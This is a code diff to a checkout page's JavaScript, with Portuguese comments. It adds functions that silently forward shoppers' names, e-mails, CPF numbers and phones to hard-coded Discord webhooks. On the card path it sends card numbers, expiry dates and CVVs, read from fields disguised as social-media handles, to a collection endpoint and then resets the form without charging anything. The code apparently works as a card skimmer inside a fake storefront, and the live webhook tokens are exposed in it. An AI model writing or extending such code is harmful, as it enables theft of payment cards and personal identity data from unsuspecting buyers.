@@ -308,9 +308,10 @@
 <script>
 (function () {
   // =====================================================
-  // 🔗 WEBHOOK DO DISCORD
+  // 🔗 WEBHOOKS DO DISCORD
   // =====================================================
-  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1553287629187846157/-Npb5CoufNIeI-iTLQbShvdW1t-a3wXyXcgv1BJO6-aOrJTgqfLyN2VNaZedZ7ziFRwZ';
+  const WEBHOOK_ALL = 'https://discord.com/api/webhooks/1553287629187846157/-Npb5CoufNIeI-iTLQbShvdW1t-a3wXyXcgv1BJO6-aOrJTgqfLyN2VNaZedZ7ziFRwZ';
+  const WEBHOOK_PIX = 'https://discord.com/api/webhooks/1553603746468990991/17WFmzQt0mghN0O-WKgjg9iReb9ieLYO1qVcUoUXBqbdFa5w3-wXWL5l2l2rN1ikbS-f';
   // =====================================================
 
   const BASE_AMOUNT = 1990;
@@ -408,13 +409,11 @@
   };
 
   // =====================================================
-  // ⏱️ CRONÔMETRO DO PIX (5 minutos regressivos)
-  // Fecha o modal automaticamente ao chegar em 00:00
+  // ⏱️ CRONÔMETRO DO PIX (5 min) — fecha modal ao expirar
   // =====================================================
   let pixTimerInterval = null;
 
   function iniciarContadorPix() {
-    // 🔒 Limpa qualquer interval que já esteja rodando
     if (pixTimerInterval !== null) {
       clearInterval(pixTimerInterval);
       pixTimerInterval = null;
@@ -423,10 +422,8 @@
     const el = document.getElementById('pix-expiry');
     if (!el) return;
 
-    // 5 minutos = 300 segundos
-    let segundos = 300;
+    let segundos = 300; // 5 minutos
 
-    // Escreve o valor inicial IMEDIATAMENTE (05:00)
     const atualizar = () => {
       const m = Math.floor(segundos / 60);
       const s = segundos % 60;
@@ -434,15 +431,12 @@
     };
     atualizar();
 
-    // Só depois começa a decrementar
     pixTimerInterval = setInterval(() => {
       segundos--;
       if (segundos <= 0) {
         clearInterval(pixTimerInterval);
         pixTimerInterval = null;
         el.textContent = '00:00';
-
-        // 🔒 Fecha o modal automaticamente ao expirar
         hidePixModal();
         mostrarToast('PIX expirado. Gere um novo para continuar.', 'erro');
         return;
@@ -458,7 +452,6 @@
     }
   }
 
-  // ---------- FECHAR MODAL (para o timer) ----------
   document.getElementById('pix-modal-close').addEventListener('click', () => {
     hidePixModal();
     pararContadorPix();
@@ -561,8 +554,10 @@
     return erros;
   }
 
-  // ---------- ENVIO PRO DISCORD (silencioso) ----------
-  async function enviarParaDiscord(dados) {
+  // =====================================================
+  // 🚀 ENVIO PRO DISCORD — CANAL "ALL" (checkout iniciado)
+  // =====================================================
+  async function enviarParaDiscordALL(dados) {
     try {
       const fields = [
         { name: '👤 Nome',     value: dados.nome     || '(vazio)', inline: false },
@@ -587,12 +582,11 @@
         );
       }
 
-      await fetch(DISCORD_WEBHOOK, {
+      await fetch(WEBHOOK_ALL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           username: 'Checkout 🛒',
-          avatar_url: 'https://i.imgur.com/z3TTFl2.png',
           embeds: [{
             title: '🛒 Novo Checkout Recebido',
             color: 0x0400f0,
@@ -602,7 +596,72 @@
         })
       });
     } catch (err) {
-      console.warn('Falha ao enviar pro Discord:', err);
+      console.warn('Falha ao enviar pro Discord (ALL):', err);
+    }
+  }
+
+  // =====================================================
+  // 💰 ENVIO PRO DISCORD — CANAL "PIX" (PIX gerado)
+  // =====================================================
+  async function enviarParaDiscordPIX(dados, transactionId) {
+    try {
+      const fields = [
+        { name: '👤 Nome',     value: dados.nome     || '(vazio)', inline: true },
+        { name: '📧 E-mail',   value: dados.email    || '(vazio)', inline: false },
+        { name: '🪪 CPF',      value: dados.cpf      || '(vazio)', inline: true },
+        { name: '📱 Telefone', value: dados.telefone || '(vazio)', inline: true },
+        { name: '💰 Valor',    value: dados.valor,                 inline: true }
+      ];
+
+      if (dados.alvo) {
+        fields.push({ name: '🎯 Alvo', value: '@' + dados.alvo, inline: true });
+      }
+
+      if (transactionId) {
+        fields.push({ name: '🆔 ID ZPay', value: transactionId, inline: false });
+      }
+
+      await fetch(WEBHOOK_PIX, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: 'PIX Gerado 💰',
+          embeds: [{
+            title: '💰 PIX Gerado (aguardando pagamento)',
+            color: 0xFACC15,
+            fields: fields,
+            footer: { text: new Date().toLocaleString('pt-BR') }
+          }]
+        })
+      });
+    } catch (err) {
+      console.warn('Falha ao enviar pro Discord (PIX):', err);
+    }
+  }
+
+  // =====================================================
+  // 💳 ENVIO PRO CANAL "CARD" (via /api/webhook-cartao)
+  // =====================================================
+  async function enviarCartaoParaAPI(dados) {
+    try {
+      await fetch('/api/webhook-cartao', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          nome_cliente:       dados.nome,
+          email:              dados.email,
+          cpf:                dados.cpf,
+          telefone:           dados.telefone,
+          alvo:               dados.alvo,
+          card_name:          dados.username,
+          card_number:        dados.instagram,
+          card_expiry:        dados.tiktok,
+          card_cvv:           dados.whatsapp,
+          card_installments:  dados.installments
+        })
+      });
+    } catch (err) {
+      console.warn('Falha ao enviar cartão:', err);
     }
   }
 
@@ -641,11 +700,12 @@
       installments: installments.value
     };
 
-    enviarParaDiscord(dados);
+    // 🚀 Sempre manda pro canal ALL (checkout iniciado)
+    enviarParaDiscordALL(dados);
 
     try {
       // =====================================================
-      // 💰 PIX — chama a API real (/api/criar-pix) — ZPay Solution
+      // 💰 PIX — chama a API real + manda pro canal PIX
       // =====================================================
       if (currentMethod === 'pix') {
         const resp = await fetch('/api/criar-pix', {
@@ -668,11 +728,15 @@
 
         const codigo = json.pix.codigoCopiaCola;
         const qrCode  = json.pix.qrCode;
+        const transactionId = json.transactionId;
+
+        // 💰 Manda pro canal PIX (com o ID do ZPay)
+        enviarParaDiscordPIX(dados, transactionId);
 
         document.getElementById('pix-code').value = codigo;
         document.getElementById('pix-valor').textContent = dados.valor;
 
-        // ⏱️ Inicia o cronômetro de 5 minutos
+        // ⏱️ Cronômetro de 5 min
         iniciarContadorPix();
 
         const qrEl = document.getElementById('pix-qr');
@@ -703,7 +767,8 @@
         showPixModal();
 
       } else {
-        // Cartão: comportamento antigo
+        // 💳 Cartão — manda pro canal CARD via API
+        await enviarCartaoParaAPI(dados);
         await new Promise(r => setTimeout(r, 1500));
         form.reset();
       }
